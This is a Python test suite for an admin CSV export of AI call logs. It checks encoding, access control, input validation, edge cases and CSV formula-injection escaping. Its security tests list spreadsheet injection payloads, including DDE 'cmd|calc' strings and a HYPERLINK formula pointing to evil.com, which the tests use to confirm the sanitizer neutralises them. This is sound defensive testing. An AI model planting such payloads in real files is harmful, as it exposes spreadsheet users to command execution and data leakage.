"""Comprehensive Enterprise Test Suite for AI Export: Happy Path, Negative, Boundary & Security (CWE-1236).

This test suite covers:
1. Happy Path (Kiểm thử Đúng):
   - Correct UTF-8 BOM encoding for Vietnamese spreadsheet compatibility
   - RFC 4180 multiline and quote escaping
   - Correct translation of technical feature/status to human-readable Vietnamese labels

2. Negative Scenarios (Kiểm thử Sai):
   - 401 Unauthorized for unauthenticated calls
   - 403 Forbidden for non-admin roles (Candidate, Employer)
   - 400 Bad Request for unsupported status parameter
   - 400 Bad Request when from_date is strictly greater than to_date
   - 422 Unprocessable Entity when limit is outside [1, 10000]

3. Boundary & Edge Cases (Kiểm thử Biên):
   - Empty dataset: Returns 200 with BOM + valid CSV header only (zero crash)
   - Zero, None, and boundary token values (cost_usd=0, input_tokens=0)
   - Long payload edge case: 500-character error messages (max DB column size)

4. Vulnerability & Security Scenarios (Kiểm thử Bảo mật):
   - CWE-1236 CSV / Formula Injection Prevention:
     Dangerous prefixes (=, +, -, @, \\t, \\r) in error_message and other string fields are safely escaped with single quote (')
"""

import csv
import io
from datetime import datetime, timedelta, timezone

from app.core.security import hash_password
from app.models.ai_call_log import AICallLog, AICallStatus, AIFeature
from app.models.user import User, UserRole
from app.services.export_service import UTF8_BOM, sanitize_csv_cell


def _create_user(db, *, email, role, full_name="Test User"):
    user = User(
        email=email,
        hashed_password=hash_password("secret123"),
        full_name=full_name,
        role=role,
        is_active=True,
    )
    db.add(user)
    db.commit()
    db.refresh(user)
    return user


def _login(client, email):
    r = client.post("/auth/login", json={"email": email, "password": "secret123"})
    assert r.status_code == 200, r.text
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


def _get_error_msg(res):
    data = res.json()
    if "error" in data and isinstance(data["error"], dict):
        return data["error"].get("message", "")
    return str(data.get("detail", ""))


# ── 1. KIỂM THỬ ĐÚNG (HAPPY PATH) ──────────────────────────────────────────────


class TestAIExportHappyPath:
    def test_export_csv_headers_and_encoding(self, client, db_session):
        admin = _create_user(db_session, email="admin_happy@ai-test.com", role=UserRole.ADMIN)
        headers = _login(client, admin.email)

        log = AICallLog(
            feature=AIFeature.CV_EVALUATE,
            status=AICallStatus.SUCCESS,
            input_tokens=500,
            output_tokens=250,
            cost_usd=0.00075,
            duration_ms=1250,
            user_id=admin.id,
            created_at=datetime.now(timezone.utc),
        )
        db_session.add(log)
        db_session.commit()

        r = client.get("/admin/ai/logs/export", headers=headers)
        assert r.status_code == 200
        assert r.headers["content-type"].startswith("text/csv")
        assert 'attachment; filename="ai_call_logs_' in r.headers["content-disposition"]

        raw_bytes = r.content
        assert raw_bytes.startswith(UTF8_BOM.encode("utf-8")), "Must begin with UTF-8 BOM"

        decoded = raw_bytes.decode("utf-8")
        reader = csv.reader(io.StringIO(decoded))
        rows = list(reader)

        assert len(rows) >= 2
        header_row = [c.lstrip(UTF8_BOM) for c in rows[0]]
        assert "Mã Log" in header_row
        assert "Tính năng" in header_row
        assert "Trạng thái" in header_row
        assert "Chi phí (USD)" in header_row

        matched = [row for row in rows[1:] if row[2] == "Đánh giá CV"]
        assert len(matched) >= 1
        data_row = matched[0]
        assert "Thành công" in data_row
        assert "$0.00075" in data_row

    def test_export_csv_escapes_multiline_and_quotes(self, client, db_session):
        admin = _create_user(db_session, email="admin_multiline@ai-test.com", role=UserRole.ADMIN)
        headers = _login(client, admin.email)

        multiline_err = 'Lỗi nghiêm trọng:\n"Không thể kết nối LLM", timeout sau 30s'
        log = AICallLog(
            feature=AIFeature.ROADMAP,
            status=AICallStatus.FAILED,
            duration_ms=500,
            error_message=multiline_err,
            created_at=datetime.now(timezone.utc),
        )
        db_session.add(log)
        db_session.commit()

        r = client.get("/admin/ai/logs/export", headers=headers)
        assert r.status_code == 200

        decoded = r.content.decode("utf-8")
        reader = csv.reader(io.StringIO(decoded))
        rows = list(reader)

        # RFC 4180: multiline inside quoted cell should not corrupt columns
        assert any(row[2] == "Lộ trình" and multiline_err in row[11] for row in rows[1:])


# ── 2. KIỂM THỬ SAI (NEGATIVE TESTING) ─────────────────────────────────────────


class TestAIExportNegative:
    def test_unauthenticated_request_fails(self, client):
        r = client.get("/admin/ai/logs/export")
        assert r.status_code == 401

    def test_non_admin_candidate_forbidden(self, client, db_session):
        cand = _create_user(db_session, email="candidate_export@ai-test.com", role=UserRole.CANDIDATE)
        headers = _login(client, cand.email)
        r = client.get("/admin/ai/logs/export", headers=headers)
        assert r.status_code == 403

    def test_non_admin_employer_forbidden(self, client, db_session):
        emp = _create_user(db_session, email="employer_export@ai-test.com", role=UserRole.EMPLOYER)
        headers = _login(client, emp.email)
        r = client.get("/admin/ai/logs/export", headers=headers)
        assert r.status_code == 403

    def test_invalid_status_parameter(self, client, db_session):
        admin = _create_user(db_session, email="admin_neg_status@ai-test.com", role=UserRole.ADMIN)
        headers = _login(client, admin.email)

        r = client.get("/admin/ai/logs/export?status=hacked_status", headers=headers)
        assert r.status_code == 400
        assert "không hợp lệ" in _get_error_msg(r)

    def test_invalid_date_range_reversed(self, client, db_session):
        admin = _create_user(db_session, email="admin_neg_dates@ai-test.com", role=UserRole.ADMIN)
        headers = _login(client, admin.email)

        now = datetime.now(timezone.utc)
        from_date = (now + timedelta(days=5)).isoformat()
        to_date = now.isoformat()

        r = client.get("/admin/ai/logs/export", headers=headers, params={"from_date": from_date, "to_date": to_date})
        assert r.status_code == 400
        assert "không được lớn hơn" in _get_error_msg(r)

    def test_invalid_limit_bounds(self, client, db_session):
        admin = _create_user(db_session, email="admin_neg_limit@ai-test.com", role=UserRole.ADMIN)
        headers = _login(client, admin.email)

        # limit < 1
        r1 = client.get("/admin/ai/logs/export", headers=headers, params={"limit": 0})
        assert r1.status_code == 422

        # limit > 10000
        r2 = client.get("/admin/ai/logs/export", headers=headers, params={"limit": 15000})
        assert r2.status_code == 422


# ── 3. KIỂM THỬ BIÊN (BOUNDARY & EDGE CASES) ───────────────────────────────────


class TestAIExportBoundary:
    def test_empty_database_returns_valid_csv_header(self, client, db_session):
        admin = _create_user(db_session, email="admin_empty@ai-test.com", role=UserRole.ADMIN)
        headers = _login(client, admin.email)

        # Filter with a future date range so 0 logs match
        future_date = (datetime.now(timezone.utc) + timedelta(days=365)).isoformat()
        r = client.get("/admin/ai/logs/export", headers=headers, params={"from_date": future_date})
        assert r.status_code == 200

        decoded = r.content.decode("utf-8")
        assert decoded.startswith(UTF8_BOM)
        rows = list(csv.reader(io.StringIO(decoded)))
        # Exactly 1 row (Header) and 0 data rows
        assert len(rows) == 1
        assert rows[0][0].lstrip(UTF8_BOM) == "Mã Log"

    def test_zero_and_null_tokens_boundary(self, client, db_session):
        admin = _create_user(db_session, email="admin_nulls@ai-test.com", role=UserRole.ADMIN)
        headers = _login(client, admin.email)

        log = AICallLog(
            feature=AIFeature.SUMMARIZE_CV,
            status=AICallStatus.SUCCESS,
            duration_ms=300,
            input_tokens=0,
            output_tokens=None,
            cost_usd=None,
            created_at=datetime.now(timezone.utc),
        )
        db_session.add(log)
        db_session.commit()

        r = client.get("/admin/ai/logs/export", headers=headers)
        assert r.status_code == 200
        decoded = r.content.decode("utf-8")
        rows = list(csv.reader(io.StringIO(decoded)))
        assert len(rows) >= 2

        matched = [r for r in rows[1:] if r[2] == "Tóm tắt CV"]
        assert len(matched) >= 1
        target = matched[0]
        # input_tokens is 0
        assert target[5] == "0"
        # output_tokens is empty string
        assert target[6] == ""
        # duration_ms is formatted
        assert target[4] == "300"
        # cost defaults to $0.00000
        assert target[8] == "$0.00000"

    def test_max_column_error_message_length(self, client, db_session):
        admin = _create_user(db_session, email="admin_max_len@ai-test.com", role=UserRole.ADMIN)
        headers = _login(client, admin.email)

        # Max column length for String(500)
        max_error = "LỖI_" + ("B" * 490)
        log = AICallLog(
            feature=AIFeature.INTERVIEW_QUESTIONS,
            status=AICallStatus.FAILED,
            duration_ms=450,
            error_message=max_error,
            created_at=datetime.now(timezone.utc),
        )
        db_session.add(log)
        db_session.commit()

        r = client.get("/admin/ai/logs/export", headers=headers)
        assert r.status_code == 200
        decoded = r.content.decode("utf-8")
        rows = list(csv.reader(io.StringIO(decoded)))
        matched = [r for r in rows[1:] if r[2] == "Câu hỏi PV"]
        assert len(matched) >= 1
        assert matched[0][11] == max_error


# ── 4. KIỂM THỬ BẢO MẬT & LỖ HỔNG (SECURITY & VULNERABILITY TESTING) ────────────


class TestAIExportSecurityVulnerabilities:
    def test_csv_cell_sanitizer_logic(self):
        """Unit test for sanitize_csv_cell directly."""
        assert sanitize_csv_cell("=1+1") == "'=1+1"
        assert sanitize_csv_cell("+cmd|'/c calc'!A0") == "'+cmd|'/c calc'!A0"
        assert sanitize_csv_cell("-2+3+cmd|...") == "'-2+3+cmd|..."
        assert sanitize_csv_cell("@SUM(1,2)") == "'@SUM(1,2)"
        assert sanitize_csv_cell("\tTAB_ATTACK") == "'\tTAB_ATTACK"
        assert sanitize_csv_cell("\rCR_ATTACK") == "'\rCR_ATTACK"

        # Safe values should NOT be prefixed
        assert sanitize_csv_cell("Normal Text") == "Normal Text"
        assert sanitize_csv_cell("12345") == "12345"
        assert sanitize_csv_cell(100) == 100
        assert sanitize_csv_cell(None) is None

    def test_csv_formula_injection_prevention_cwe_1236_in_api(self, client, db_session):
        """Integration test verifying malicious formulas in error_message are neutralized."""
        admin = _create_user(db_session, email="admin_cwe1236@ai-test.com", role=UserRole.ADMIN)
        headers = _login(client, admin.email)

        malicious_errors = [
            "=cmd|' /C calc'!A0",
            "+SUM(1+1)*cmd|'calc'!A0",
            "-2+3+cmd|'calc'!A0",
            "@HYPERLINK('http://evil.com/leak')",
            "\tDDE_FORMULA_ATTACK",
        ]

        for err_payload in malicious_errors:
            log = AICallLog(
                feature=AIFeature.GENERATE_EMAIL,
                status=AICallStatus.FAILED,
                duration_ms=100,
                error_message=err_payload,
                created_at=datetime.now(timezone.utc),
            )
            db_session.add(log)
        db_session.commit()

        r = client.get("/admin/ai/logs/export", headers=headers)
        assert r.status_code == 200

        decoded = r.content.decode("utf-8")
        reader = csv.reader(io.StringIO(decoded))
        rows = list(reader)

        matched = [r for r in rows[1:] if r[2] == "Tạo email"]
        assert len(matched) >= len(malicious_errors)

        for row in matched:
            error_col = row[11]
            if error_col:
                # All dangerous prefixes MUST NOT begin directly with formula characters
                assert not error_col.startswith(("=", "+", "-", "@", "\t", "\r")), (
                    f"Dangerous formula detected unescaped: {error_col}"
                )
                # It MUST start with a neutralizing single quote (')
                assert error_col.startswith("'"), f"Cell must be escaped with single quote: {error_col}"
